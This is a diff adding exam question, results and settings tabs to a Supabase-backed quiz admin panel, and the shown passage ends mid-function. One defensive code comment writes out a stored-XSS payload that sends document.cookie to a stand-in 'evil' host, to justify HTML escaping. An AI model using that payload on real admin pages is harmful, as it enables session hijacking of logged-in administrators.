@@ -502,6 +502,126 @@
     background:var(--primary);color:var(--on-primary);border-color:var(--primary);
   }
   .modal-actions .btn{flex:1;}
+
+  /* ---------- the exam half ---------- */
+  .grid3{display:grid;gap:14px;}
+  @media(min-width:760px){ .grid3{grid-template-columns:repeat(3,1fr);} }
+
+  h3.sec-h{
+    font-size:.82rem;text-transform:uppercase;letter-spacing:.06em;
+    color:var(--muted);margin:26px 0 12px;padding-bottom:7px;
+    border-bottom:1px solid var(--border);font-weight:700;
+  }
+
+  .exam-missing{
+    background:var(--danger-bg);border:1px solid var(--danger);
+    border-radius:var(--radius-md);padding:16px 18px;margin-bottom:18px;
+    font-size:.9rem;line-height:1.7;color:var(--text);
+  }
+  .exam-missing code{
+    background:rgba(0,0,0,.08);padding:2px 6px;border-radius:5px;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.86em;
+  }
+
+  .exam-q-filters{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:14px;}
+
+  /* Divides the quiz tabs from the exam tabs, so it reads as two
+     products in one panel rather than eight unrelated tabs. */
+  .tab-split{
+    width:1px;align-self:stretch;margin:0 6px;background:var(--border);flex:none;
+  }
+  @media(max-width:700px){ .tab-split{display:none;} }
+
+  .q-ord.mcq{background:#E0E7FF;color:#3730A3;}
+  .q-ord.written{background:#FEF3C7;color:#92400E;}
+  .q-ord.practical{background:#DCFCE7;color:#166534;}
+  .q-ord{font-size:.68rem;font-weight:800;letter-spacing:.04em;}
+
+  .pill.warnp{background:#FEF3C7;color:#92400E;}
+  .pill.done{background:#DCFCE7;color:#166534;}
+  .pill.mcq{background:#E0E7FF;color:#3730A3;}
+  .pill.written{background:#FEF3C7;color:#92400E;}
+  .pill.practical{background:#DCFCE7;color:#166534;}
+
+  .time-total{
+    font-size:.86rem;color:var(--muted);background:var(--bg-soft);
+    border-radius:var(--radius-sm);padding:10px 13px;margin:-4px 0 6px;
+    font-variant-numeric:tabular-nums;
+  }
+
+  .modal-wide{max-width:860px;}
+
+  /* ---------- marking one paper ---------- */
+  .mk-ans{
+    border:1px solid var(--border);border-radius:var(--radius-md);
+    padding:16px;margin-bottom:14px;background:var(--bg-soft);
+  }
+  .mk-head{display:flex;align-items:center;gap:10px;margin-bottom:9px;}
+  .mk-head strong{font-size:.85rem;color:var(--muted);}
+  .mk-prompt{font-size:.94rem;line-height:1.6;font-weight:600;margin-bottom:12px;white-space:pre-wrap;}
+
+  .mk-opts{display:flex;flex-direction:column;gap:5px;margin-bottom:10px;}
+  .mk-opt{
+    font-size:.87rem;padding:7px 11px;border-radius:var(--radius-sm);
+    background:var(--card);border:1px solid var(--border);
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    white-space:pre-wrap;
+  }
+  .mk-opt.right{border-color:#16A34A;background:#F0FDF4;}
+  .mk-opt.chosen{font-weight:700;}
+  .mk-opt.chosen:not(.right){border-color:var(--danger);background:var(--danger-bg);}
+  .mk-opt.blank{color:var(--muted);font-style:italic;border-style:dashed;}
+
+  .mk-auto{font-size:.85rem;font-weight:700;padding:7px 11px;border-radius:var(--radius-sm);display:inline-block;}
+  .mk-auto.ok{background:#DCFCE7;color:#166534;}
+  .mk-auto.no{background:var(--danger-bg);color:var(--danger);}
+
+  .mk-model{margin-bottom:12px;}
+  .mk-model summary{
+    cursor:pointer;font-size:.82rem;font-weight:700;color:var(--muted);
+    text-transform:uppercase;letter-spacing:.05em;padding:6px 0;
+  }
+  .mk-model p{
+    margin:6px 0 0;font-size:.88rem;line-height:1.65;white-space:pre-wrap;
+    background:#FFFBEB;border-left:3px solid #F59E0B;padding:11px 13px;border-radius:0 8px 8px 0;
+  }
+
+  .mk-text{
+    background:var(--card);border:1px solid var(--border);border-radius:var(--radius-sm);
+    padding:13px 15px;font-size:.9rem;line-height:1.75;white-space:pre-wrap;
+    max-height:340px;overflow:auto;margin-bottom:12px;
+  }
+  .mk-text.code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.84rem;}
+
+  .mk-grade{display:flex;gap:9px;align-items:center;flex-wrap:wrap;}
+  .mk-mark{width:74px !important;text-align:center;font-weight:700;}
+  .mk-outof{font-size:.86rem;color:var(--muted);font-weight:700;}
+  .mk-fb{flex:1;min-width:180px;}
+  .mk-state{font-size:.76rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;color:var(--muted);}
+  .mk-state.done{color:#166534;}
+
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]) .mk-opt.right{background:#0F2A1A;border-color:#16A34A;}
+    :root:not([data-theme="light"]) .mk-model p{background:#2A2312;border-left-color:#F59E0B;}
+    :root:not([data-theme="light"]) .q-ord.mcq{background:#262F52;color:#C7D2FE;}
+    :root:not([data-theme="light"]) .q-ord.written{background:#3A2E12;color:#FCD34D;}
+    :root:not([data-theme="light"]) .q-ord.practical{background:#132D1E;color:#86EFAC;}
+    :root:not([data-theme="light"]) .pill.warnp{background:#3A2E12;color:#FCD34D;}
+    :root:not([data-theme="light"]) .pill.done{background:#132D1E;color:#86EFAC;}
+    :root:not([data-theme="light"]) .pill.mcq{background:#262F52;color:#C7D2FE;}
+    :root:not([data-theme="light"]) .pill.written{background:#3A2E12;color:#FCD34D;}
+    :root:not([data-theme="light"]) .pill.practical{background:#132D1E;color:#86EFAC;}
+  }
+  :root[data-theme="dark"] .mk-opt.right{background:#0F2A1A;border-color:#16A34A;}
+  :root[data-theme="dark"] .mk-model p{background:#2A2312;border-left-color:#F59E0B;}
+  :root[data-theme="dark"] .q-ord.mcq{background:#262F52;color:#C7D2FE;}
+  :root[data-theme="dark"] .q-ord.written{background:#3A2E12;color:#FCD34D;}
+  :root[data-theme="dark"] .q-ord.practical{background:#132D1E;color:#86EFAC;}
+  :root[data-theme="dark"] .pill.warnp{background:#3A2E12;color:#FCD34D;}
+  :root[data-theme="dark"] .pill.done{background:#132D1E;color:#86EFAC;}
+  :root[data-theme="dark"] .pill.mcq{background:#262F52;color:#C7D2FE;}
+  :root[data-theme="dark"] .pill.written{background:#3A2E12;color:#FCD34D;}
+  :root[data-theme="dark"] .pill.practical{background:#132D1E;color:#86EFAC;}
 </style>
 </head>
 <body>
@@ -551,6 +671,10 @@
       <button class="tab" data-tab="results" type="button">Results</button>
       <button class="tab" data-tab="feedback" type="button">Feedback<span class="badge hidden" id="fbBadge">0</span></button>
       <button class="tab" data-tab="settings" type="button">Site settings</button>
+      <span class="tab-split"></span>
+      <button class="tab" data-tab="exam-questions" type="button">Exam questions</button>
+      <button class="tab" data-tab="exam-results" type="button">Exam results<span class="badge hidden" id="exBadge">0</span></button>
+      <button class="tab" data-tab="exam-settings" type="button">Exam settings</button>
     </div>
 
     <!-- ---------- DASHBOARD ---------- -->
@@ -824,6 +948,222 @@
         <button class="btn btn-primary" id="saveSettingsBtn" type="button">Save settings</button>
       </div>
     </section>
+
+    <!-- ---------- EXAM QUESTIONS ---------- -->
+    <section id="tab-exam-questions" class="hidden">
+      <div class="stats">
+        <div class="stat"><div class="n" id="stExMcq">–</div><div class="l">MCQ in the bank</div></div>
+        <div class="stat"><div class="n" id="stExWritten">–</div><div class="l">Written</div></div>
+        <div class="stat"><div class="n" id="stExPractical">–</div><div class="l">Practical</div></div>
+        <div class="stat"><div class="n" id="stExPaper">–</div><div class="l">Marks per paper</div></div>
+      </div>
+
+      <div class="exam-missing hidden" id="examMissing">
+        <strong>The exam tables are not in your database yet.</strong>
+        Open Supabase → SQL Editor and run <code>supabase-schema.sql</code> again.
+        It leaves your quiz, results and settings exactly as they are, and adds
+        the exam half.
+      </div>
+
+      <div class="card" id="examQCard">
+        <h2>Exam question bank</h2>
+        <p class="sub">
+          Each student gets a random draw from the active questions — how many of each
+          type is set under <strong>Exam settings</strong>. MCQ is marked automatically the
+          moment a paper is submitted; written and practical answers come to you under
+          <strong>Exam results</strong>. Exam questions are English only.
+        </p>
+
+        <div class="exam-q-filters">
+          <button class="btn btn-sm btn-primary" type="button" data-qf="all">All</button>
+          <button class="btn btn-sm btn-ghost" type="button" data-qf="mcq">MCQ</button>
+          <button class="btn btn-sm btn-ghost" type="button" data-qf="written">Written</button>
+          <button class="btn btn-sm btn-ghost" type="button" data-qf="practical">Practical</button>
+          <span style="flex:1;"></span>
+          <button class="btn btn-primary btn-sm" id="addExQBtn" type="button">+ Add question</button>
+        </div>
+
+        <div id="exQList" style="margin-top:16px;"><div class="empty">Loading…</div></div>
+      </div>
+    </section>
+
+    <!-- ---------- EXAM RESULTS ---------- -->
+    <section id="tab-exam-results" class="hidden">
+      <div class="stats">
+        <div class="stat"><div class="n" id="stExStudents">–</div><div class="l">Students</div></div>
+        <div class="stat"><div class="n" id="stExSitting">–</div><div class="l">Sitting now</div></div>
+        <div class="stat"><div class="n" id="stExToMark">–</div><div class="l">Waiting to be marked</div></div>
+        <div class="stat"><div class="n" id="stExGraded">–</div><div class="l">Marked</div></div>
+        <div class="stat"><div class="n" id="stExFlagged">–</div><div class="l">Flagged</div></div>
+        <div class="stat"><div class="n" id="stExAvg">–</div><div class="l">Average</div></div>
+      </div>
+
+      <div class="card">
+        <h2>Papers</h2>
+        <p class="sub">
+          A paper lands here the moment it is submitted, with the MCQ section already
+          marked. Open one to mark the written and practical answers and to read its
+          violation log.
+        </p>
+        <div style="display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;">
+          <input type="text" id="exSearch" placeholder="Search name, student ID, batch or email…" style="flex:1;min-width:200px;">
+          <select id="exFilter" style="width:auto;">
+            <option value="all">All papers</option>
+            <option value="submitted">Waiting to be marked</option>
+            <option value="graded">Marked</option>
+            <option value="in_progress">Sitting now</option>
+            <option value="flagged">Flagged only</option>
+          </select>
+          <button class="btn btn-ghost" id="exRefreshBtn" type="button">Refresh</button>
+          <button class="btn btn-primary" id="exCsvBtn" type="button">Export CSV</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th><th>Student</th><th>ID</th><th>Batch</th>
+                <th>MCQ</th><th>Written</th><th>Practical</th><th>Total</th>
+                <th>Flags</th><th>Status</th><th>Submitted</th><th></th>
+              </tr>
+            </thead>
+            <tbody id="exAttemptRows"></tbody>
+          </table>
+        </div>
+        <div class="empty hidden" id="exNoPapers">No papers yet.</div>
+      </div>
+    </section>
+
+    <!-- ---------- EXAM SETTINGS ---------- -->
+    <section id="tab-exam-settings" class="hidden">
+      <div class="card">
+        <h2>Exam settings</h2>
+        <p class="sub">These apply to papers started after you save. A paper already in progress keeps the rules it began under.</p>
+
+        <div class="field">
+          <label>
+            <input type="checkbox" id="exsOpen" style="width:auto;margin-right:7px;vertical-align:-2px;">
+            <strong>The exam is open</strong>
+          </label>
+          <div class="sub" style="margin:4px 0 0;">
+            While this is off, the Final Exam card on the front page shows as closed and
+            nobody can start a paper. Papers already running are unaffected.
+          </div>
+        </div>
+
+        <h3 class="sec-h">The paper</h3>
+        <div class="grid3">
+          <div class="field">
+            <label for="exsMcqCount">MCQ questions</label>
+            <input type="number" id="exsMcqCount" min="0" max="200">
+          </div>
+          <div class="field">
+            <label for="exsWrittenCount">Written questions</label>
+            <input type="number" id="exsWrittenCount" min="0" max="50">
+          </div>
+          <div class="field">
+            <label for="exsPracticalCount">Practical questions</label>
+            <input type="number" id="exsPracticalCount" min="0" max="50">
+          </div>
+        </div>
+        <div class="sub" style="margin:-6px 0 16px;">
+          Drawn at random from the active bank. Asking for more than you have simply
+          serves all of them.
+        </div>
+
+        <h3 class="sec-h">Time</h3>
+        <div class="grid3">
+          <div class="field">
+            <label for="exsMcqSeconds">Seconds per MCQ</label>
+            <input type="number" id="exsMcqSeconds" min="5" max="600">
+            <div class="sub" style="margin:4px 0 0;">The paper moves on by itself when this runs out.</div>
+          </div>
+          <div class="field">
+            <label for="exsWrittenMinutes">Minutes for the written section</label>
+            <input type="number" id="exsWrittenMinutes" min="1" max="360">
+          </div>
+          <div class="field">
+            <label for="exsPracticalMinutes">Minutes for the practical section</label>
+            <input type="number" id="exsPracticalMinutes" min="1" max="360">
+          </div>
+        </div>
+        <div class="time-total" id="exsTimeTotal"></div>
+
+        <h3 class="sec-h">Anti-cheat</h3>
+        <div class="sub" style="margin:-8px 0 14px;">
+          The browser-side blocks below are a deterrent, not a lock — a student who knows
+          their way around developer tools can get past them. What they cannot get past is
+          the database: correct answers are never sent to the browser, the clock is the
+          server's, and every trip below is logged with a timestamp whether or not the
+          block itself worked. Mark the log, not the block.
+        </div>
+
+        <div class="field">
+          <label for="exsMaxViol">Violations before the paper submits itself</label>
+          <input type="number" id="exsMaxViol" min="1" max="20">
+          <div class="sub" style="margin:4px 0 0;">
+            The student sees a warning with a running count each time. Set it high if your
+            students sit the exam on phones, where a notification can steal focus through
+            no fault of theirs.
+          </div>
+        </div>
+
+        <div class="field">
+          <label><input type="checkbox" id="exsFullscreen" style="width:auto;margin-right:7px;vertical-align:-2px;">Require fullscreen</label>
+        </div>
+        <div class="field">
+          <label><input type="checkbox" id="exsBlockCopy" style="width:auto;margin-right:7px;vertical-align:-2px;">Block copy, cut, paste and right-click</label>
+        </div>
+        <div class="field">
+          <label><input type="checkbox" id="exsTabSwitch" style="width:auto;margin-right:7px;vertical-align:-2px;">Record tab and window switches</label>
+        </div>
+        <div class="field">
+          <label><input type="checkbox" id="exsShuffleQ" style="width:auto;margin-right:7px;vertical-align:-2px;">Shuffle the question order per student</label>
+        </div>
+        <div class="field">
+          <label><input type="checkbox" id="exsShuffleO" style="width:auto;margin-right:7px;vertical-align:-2px;">Shuffle MCQ options per student</label>
+        </div>
+        <div class="field">
+          <label><input type="checkbox" id="exsOneAttempt" style="width:auto;margin-right:7px;vertical-align:-2px;">One sitting per student ID</label>
+          <div class="sub" style="margin:4px 0 0;">
+            Enforced in the database, not the browser. A student who is thrown offline
+            mid-paper still gets back into the same paper with their answers intact —
+            this only blocks a genuine second sitting.
+          </div>
+        </div>
+
+        <h3 class="sec-h">Passing</h3>
+        <div class="field" style="max-width:240px;">
+          <label for="exsPass">Pass mark (%)</label>
+          <input type="number" id="exsPass" min="0" max="100">
+        </div>
+
+        <h3 class="sec-h">Wording</h3>
+        <div class="grid2">
+          <div class="field">
+            <label for="exsTitle">Exam title</label>
+            <input type="text" id="exsTitle" maxlength="80">
+          </div>
+          <div class="field">
+            <label for="exsSub">Subtitle</label>
+            <input type="text" id="exsSub" maxlength="120">
+          </div>
+        </div>
+        <div class="field">
+          <label for="exsRules">Extra rule line shown before the exam starts</label>
+          <textarea id="exsRules"></textarea>
+          <div class="sub" style="margin:4px 0 0;">Appears above the generated rule list. Leave blank to show only the generated rules.</div>
+        </div>
+        <div class="field">
+          <label for="exsClosed">Message shown while the exam is closed</label>
+          <textarea id="exsClosed"></textarea>
+        </div>
+
+        <div class="modal-actions" style="justify-content:flex-start;">
+          <button class="btn btn-primary" id="exsSaveBtn" type="button">Save exam settings</button>
+        </div>
+      </div>
+    </section>
+
   </main>
 </div>
 
@@ -927,7 +1267,8 @@
       document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
       btn.classList.add('active');
       const target = btn.getAttribute('data-tab');
-      ['dashboard','questions','results','feedback','settings'].forEach(t=>{
+      ['dashboard','questions','results','feedback','settings',
+       'exam-questions','exam-results','exam-settings'].forEach(t=>{
         $('tab-'+t).classList.toggle('hidden', t !== target);
       });
 
@@ -936,6 +1277,11 @@
       if(target === 'dashboard'){ loadDashboard(true); startDashLive(); }
       else stopDashLive();
       if(target === 'feedback') loadFeedback();
+      // The exam tabs are refreshed on open so a paper submitted while
+      // you were on another tab shows up without a manual reload.
+      if(target === 'exam-questions') loadExamQuestions();
+      if(target === 'exam-results')   loadExamAttempts();
+      if(target === 'exam-settings')  loadExamSettingsAdmin();
     });
   });
 
@@ -943,7 +1289,11 @@
   async function loadEverything(){
     await Promise.all([
       loadQuestions(), loadAttempts(), loadSettings(),
-      loadDashboard(), loadFeedback()
+      loadDashboard(), loadFeedback(),
+      // The exam half. These resolve even when the exam tables are
+      // missing - loadExamQuestions() shows the "run the schema" note
+      // rather than throwing and taking the whole panel down with it.
+      loadExamSettingsAdmin().then(loadExamQuestions).then(loadExamAttempts)
     ]);
     startDashLive();
   }
@@ -2203,6 +2553,801 @@
     toast('Exported ' + rows.length + ' rows');
   });
 
+
+  // ============================================================
+  //  THE EXAM HALF
+  //  Questions, papers and marking. Everything here needs a logged-in
+  //  admin - the RLS policies see to that - so unlike the student side
+  //  these calls do read correct answers.
+  // ============================================================
+
+  let examQuestions = [];
+  let examAttempts  = [];
+  let examSettings  = null;
+  let examQFilter   = 'all';
+  let examInstalled = true;
+
+  // A student picks their own name, batch and email, and those strings
+  // get rendered into this page. Without escaping, a name like
+  //   <img src=x onerror=fetch('evil?c='+document.cookie)>
+  // would run inside YOUR logged-in admin session, not theirs. Anything
+  // student-supplied goes through here before it touches innerHTML.
+  function escapeHtml(s){
+    return String(s == null ? '' : s)
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+  }
+
+  function fmtWhen(ts){
+    if(!ts) return '—';
+    const d = new Date(ts);
+    return isNaN(d) ? '—' : d.toLocaleString();
+  }
+
+  // ---------------- question bank ----------------
+  async function loadExamQuestions(){
+    const { data, error } = await sb.from('exam_questions')
+      .select('*').order('qtype', {ascending:true}).order('sort_order', {ascending:true});
+
+    if(error){
+      // The one error worth handling specially: the admin has not run the
+      // updated schema yet, so none of this exists.
+      examInstalled = false;
+      $('examMissing').classList.remove('hidden');
+      $('examQCard').classList.add('hidden');
+      $('exQList').innerHTML = '';
+      return;
+    }
+    examInstalled = true;
+    $('examMissing').classList.add('hidden');
+    $('examQCard').classList.remove('hidden');
+    examQuestions = data || [];
+    renderExamQuestions();
+  }
+
+  function examPaperMarks(){
+    const s = examSettings;
+    if(!s) return 0;
+    const pick = (t, n)=>{
+      const pool = examQuestions.filter(q=>q.is_active && q.qtype===t)
+                                .map(q=>q.marks).sort((a,b)=>b-a);
+      return pool.slice(0, n).reduce((a,b)=>a+b, 0);
+    };
+    return pick('mcq', s.mcq_count) + pick('written', s.written_count)
+         + pick('practical', s.practical_count);
+  }
+
+  function renderExamQuestions(){
+    const counts = {mcq:0, written:0, practical:0};
+    examQuestions.forEach(q=>{ if(q.is_active) counts[q.qtype]++; });
+    $('stExMcq').textContent       = counts.mcq;
+    $('stExWritten').textContent   = counts.written;
+    $('stExPractical').textContent = counts.practical;
+    $('stExPaper').textContent     = examSettings ? examPaperMarks() : '–';
+
+    const wrap = $('exQList');
+    wrap.innerHTML = '';
+
+    const list = examQFilter === 'all'
+      ? examQuestions
+      : examQuestions.filter(q=>q.qtype === examQFilter);
+
+    if(!list.length){
+      wrap.innerHTML = '<div class="empty">Nothing here yet. Add your first question above.</div>';
+      return;
+    }
+
+    list.forEach((q)=>{
+      const item = document.createElement('div');
+      item.className = 'q-item' + (q.is_active ? '' : ' inactive');
+
+      const head = document.createElement('div');
+      head.className = 'q-head';
+
+      const ord = document.createElement('div');
+      ord.className = 'q-ord ' + q.qtype;
+      ord.textContent = {mcq:'MCQ', written:'WR', practical:'PR'}[q.qtype];
+
+      const body = document.createElement('div');
+      body.className = 'q-body';
+
+      const prompt = document.createElement('div');
+      prompt.className = 'q-en';
+      prompt.textContent = q.prompt;
+
+      const meta = document.createElement('div');
+      meta.className = 'q-meta';
+
+      const st = document.createElement('span');
+      st.className = 'pill ' + (q.is_active ? 'on' : 'off');
+      st.textContent = q.is_active ? 'Active' : 'Hidden';
+
+      const mk = document.createElement('span');
+      mk.className = 'pill';
+      mk.textContent = q.marks + (q.marks === 1 ? ' mark' : ' marks');
+
+      meta.append(st, mk);
+
+      if(q.qtype === 'mcq'){
+        const opts = q.options || [];
+        const right = opts.find(o=>o.correct);
+        const oc = document.createElement('span');
+        oc.className = 'pill';
+        oc.textContent = opts.length + ' options';
+        const ans = document.createElement('span');
+        ans.className = 'pill' + (right ? '' : ' off');
+        ans.textContent = right ? ('Answer: ' + right.text) : 'No correct answer set!';
+        meta.append(oc, ans);
+      }else{
+        const ma = document.createElement('span');
+        ma.className = 'pill' + (q.model_answer ? '' : ' off');
+        ma.textContent = q.model_answer ? 'Marking notes set' : 'No marking notes';
+        meta.append(ma);
+      }
+
+      const actions = document.createElement('div');
+      actions.className = 'row-actions';
+      actions.style.marginTop = '10px';
+      actions.append(
+        mkBtn('Edit', 'btn-ghost', ()=>openExamEditor(q)),
+        mkBtn(q.is_active ? 'Hide' : 'Show', 'btn-ghost', ()=>toggleExamActive(q)),
+        mkBtn('Duplicate', 'btn-ghost', ()=>duplicateExamQuestion(q)),
+        mkBtn('Delete', 'btn-danger', ()=>removeExamQuestion(q))
+      );
+
+      body.append(prompt, meta, actions);
+      head.append(ord, body);
+      item.append(head);
+      wrap.append(item);
+    });
+  }
+
+  async function toggleExamActive(q){
+    const { error } = await sb.from('exam_questions')
+      .update({is_active: !q.is_active, updated_at:new Date().toISOString()}).eq('id', q.id);
+    if(error) return toast(error.message, true);
+    loadExamQuestions();
+  }
+
+  async function duplicateExamQuestion(q){
+    const copy = {
+      qtype:q.qtype, sort_order:(q.sort_order||0)+1,
+      prompt:q.prompt + ' (copy)', options:q.options, marks:q.marks,
+      model_answer:q.model_answer, hint:q.hint, is_active:false
+    };
+    const { error } = await sb.from('exam_questions').insert(copy);
+    if(error) return toast(error.message, true);
+    toast('Duplicated as a hidden draft');
+    loadExamQuestions();
+  }
+
+  async function removeExamQuestion(q){
+    if(!confirm('Delete this question?\n\nPapers that already used it keep their copy, so past results stay correct.')) return;
+    const { error } = await sb.from('exam_questions').delete().eq('id', q.id);
+    if(error) return toast(error.message, true);
+    toast('Question deleted');
+    loadExamQuestions();
+  }
+
+  // ---------------- question editor ----------------
+  function openExamEditor(q){
+    const isNew = !q;
+    const draft = q || {
+      qtype:'mcq', sort_order:examQuestions.length + 1, prompt:'',
+      marks:1, model_answer:'', hint:'', is_active:true,
+      options:[{text:'',correct:true},{text:'',correct:false},
+               {text:'',correct:false},{text:'',correct:false}]
+    };
+
+    const back = document.createElement('div');
+    back.className = 'modal-back';
+    back.innerHTML = `
+      <div class="modal">
+        <h2>${isNew ? 'Add exam question' : 'Edit exam question'}</h2>
+
+        <div class="grid3">
+          <div class="field">
+            <label>Type</label>
+            <select id="exEdType">
+              <option value="mcq">MCQ — marked automatically</option>
+              <option value="written">Written — marked by you</option>
+              <option value="practical">Practical — marked by you</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Marks</label>
+            <input type="number" id="exEdMarks" min="1" max="100">
+          </div>
+          <div class="field">
+            <label>Order</label>
+            <input type="number" id="exEdOrder" min="0">
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Question</label>
+          <textarea id="exEdPrompt" style="min-height:110px;"></textarea>
+        </div>
+
+        <div class="field">
+          <label>Hint shown under the question <span class="sub" style="display:inline;">(optional)</span></label>
+          <input type="text" id="exEdHint" maxlength="200">
+        </div>
+
+        <div id="exEdMcqBox">
+          <label style="margin-bottom:8px;">Options — pick the correct one on the left</label>
+          <div id="exEdOptions"></div>
+          <button class="btn btn-ghost btn-sm" type="button" id="exEdAddOpt">+ Add option</button>
+        </div>
+
+        <div class="field hidden" id="exEdModelBox" style="margin-top:18px;">
+          <label>Marking notes — what a full-mark answer contains</label>
+          <textarea id="exEdModel" style="min-height:130px;"></textarea>
+          <div class="sub" style="margin:4px 0 0;">
+            Only you ever see this. It sits beside the student's answer while you mark,
+            so you are not re-deciding the standard on every paper.
+          </div>
+        </div>
+
+        <div class="field" style="margin-top:18px;">
+          <label>
+            <input type="checkbox" id="exEdActive" style="width:auto;margin-right:7px;vertical-align:-2px;">
+            Active (can be drawn into a paper)
+          </label>
+        </div>
+
+        <div class="modal-actions">
+          <button class="btn btn-ghost" type="button" id="exEdCancel">Cancel</button>
+          <button class="btn btn-primary" type="button" id="exEdSave">${isNew ? 'Create' : 'Save changes'}</button>
+        </div>
+      </div>`;
+    $('modalHost').append(back);
+
+    $('exEdType').value    = draft.qtype;
+    $('exEdMarks').value   = draft.marks;
+    $('exEdOrder').value   = draft.sort_order;
+    $('exEdPrompt').value  = draft.prompt;
+    $('exEdHint').value    = draft.hint || '';
+    $('exEdModel').value   = draft.model_answer || '';
+    $('exEdActive').checked = !!draft.is_active;
+
+    let opts = (draft.options && draft.options.length)
+      ? draft.options.map(o=>({text:o.text||'', correct:!!o.correct}))
+      : [{text:'',correct:true},{text:'',correct:false}];
+
+    function syncType(){
+      const isMcq = $('exEdType').value === 'mcq';
+      $('exEdMcqBox').classList.toggle('hidden', !isMcq);
+      $('exEdModelBox').classList.toggle('hidden', isMcq);
+      // A written answer worth one mark is almost never what you meant.
+      if(!isMcq && parseInt($('exEdMarks').value,10) === 1) $('exEdMarks').value = 10;
+    }
+    $('exEdType').addEventListener('change', syncType);
+    syncType();
+
+    function renderExOptions(){
+      const host = $('exEdOptions');
+      host.innerHTML = '';
+      opts.forEach((o, i)=>{
+        const row = document.createElement('div');
+        row.className = 'opt-row' + (o.correct ? ' is-correct' : '');
+
+        const radioWrap = document.createElement('div');
+        radioWrap.className = 'opt-radio';
+        const radio = document.createElement('input');
+        radio.type = 'radio';
+        radio.name = 'exEdCorrect';
+        radio.checked = !!o.correct;
+        radio.addEventListener('change', ()=>{
+          opts.forEach((x, xi)=>{ x.correct = (xi === i); });
+          renderExOptions();
+        });
+        const radioLabel = document.createElement('span');
+        radioLabel.textContent = 'right';
+        radioWrap.append(radio, radioLabel);
+
+        const fields = document.createElement('div');
+        fields.className = 'opt-fields';
+        const txt = document.createElement('input');
+        txt.type = 'text';
+        txt.placeholder = 'Option ' + (i + 1);
+        txt.value = o.text || '';
+        txt.addEventListener('input', ()=>{ o.text = txt.value; });
+        fields.append(txt);
+
+        const del = mkBtn('✕', 'btn-danger', ()=>{
+          if(opts.length <= 2) return toast('A question needs at least 2 options', true);
+          const wasCorrect = opts[i].correct;
+          opts.splice(i, 1);
+          if(wasCorrect) opts[0].correct = true;
+          renderExOptions();
+        });
+        del.style.alignSelf = 'center';
+
+        row.append(radioWrap, fields, del);
+        host.append(row);
+      });
+    }
+    renderExOptions();
+
+    $('exEdAddOpt').addEventListener('click', ()=>{
+      if(opts.length >= 6) return toast('6 options is plenty', true);
+      opts.push({text:'', correct:false});
+      renderExOptions();
+    });
+
+    function close(){ back.remove(); }
+    $('exEdCancel').addEventListener('click', close);
+    back.addEventListener('click', e=>{ if(e.target === back) close(); });
+
+    $('exEdSave').addEventListener('click', async ()=>{
+      const qtype = $('exEdType').value;
+      const payload = {
+        qtype,
+        sort_order: parseInt($('exEdOrder').value, 10) || 0,
+        prompt: $('exEdPrompt').value.trim(),
+        marks: Math.max(1, parseInt($('exEdMarks').value, 10) || 1),
+        hint: $('exEdHint').value.trim(),
+        model_answer: qtype === 'mcq' ? '' : $('exEdModel').value.trim(),
+        options: qtype === 'mcq'
+          ? opts.map(o=>({text:(o.text||'').trim(), correct:!!o.correct}))
+          : [],
+        is_active: $('exEdActive').checked,
+        updated_at: new Date().toISOString()
+      };
+
+      if(!payload.prompt) return toast('Write the question first', true);
+      if(qtype === 'mcq'){
+        if(payload.options.length < 2)          return toast('Add at least 2 options', true);
+        if(payload.options.some(o=>!o.text))    return toast('Every option needs text', true);
+        if(payload.options.filter(o=>o.correct).length !== 1)
+          return toast('Mark exactly one option as correct', true);
+      }else if(!payload.model_answer){
+        if(!confirm('No marking notes on this one.\n\nYou can still save it, but you will be marking from memory. Save anyway?')) return;
+      }
+
+      $('exEdSave').disabled = true;
+      const { error } = isNew
+        ? await sb.from('exam_questions').insert(payload)
+        : await sb.from('exam_questions').update(payload).eq('id', q.id);
+      $('exEdSave').disabled = false;
+
+      if(error) return toast(error.message, true);
+      toast(isNew ? 'Question added' : 'Question saved');
+      close();
+      loadExamQuestions();
+    });
+  }
+
+  // ---------------- papers ----------------
+  async function loadExamAttempts(){
+    const { data, error } = await sb.from('exam_attempts')
+      .select('*, exam_students(*)')
+      .order('started_at', {ascending:false})
+      .limit(500);
+    if(error){ examInstalled = false; return; }
+    examAttempts = data || [];
+    renderExamAttempts();
+    loadExamStats();
+  }
+
+  async function loadExamStats(){
+    const { data, error } = await sb.rpc('exam_stats');
+    if(error || !data) return;
+    $('stExStudents').textContent = data.students;
+    $('stExSitting').textContent  = data.in_progress;
+    $('stExToMark').textContent   = data.submitted;
+    $('stExGraded').textContent   = data.graded;
+    $('stExFlagged').textContent  = data.flagged;
+    $('stExAvg').textContent      = data.graded ? data.avg_percent + '%' : '–';
+
+    // Papers waiting on you, shown on the tab itself so you do not have
+    // to open it to find out.
+    const badge = $('exBadge');
+    badge.textContent = data.submitted;
+    badge.classList.toggle('hidden', !data.submitted);
+  }
+
+  function examTotals(a){
+    const got  = a.mcq_score + a.written_score + a.practical_score;
+    const outOf = a.mcq_total + a.written_total + a.practical_total;
+    return {got, outOf, pct: outOf ? Math.round(got/outOf*100) : 0};
+  }
+
+  function filteredExamAttempts(){
+    const term = ($('exSearch').value || '').trim().toLowerCase();
+    const mode = $('exFilter').value;
+    return examAttempts.filter(a=>{
+      const s = a.exam_students || {};
+      if(mode === 'flagged'){ if(!a.violation_count) return false; }
+      else if(mode !== 'all' && a.status !== mode) return false;
+      if(!term) return true;
+      return [s.name, s.student_id, s.batch, s.email, s.phone]
+        .some(v => (v||'').toLowerCase().includes(term));
+    });
+  }
+
+  function renderExamAttempts(){
+    const rows = $('exAttemptRows');
+    rows.innerHTML = '';
+    const list = filteredExamAttempts();
+
+    $('exNoPapers').classList.toggle('hidden', list.length > 0);
+
+    list.forEach((a, i)=>{
+      const s = a.exam_students || {};
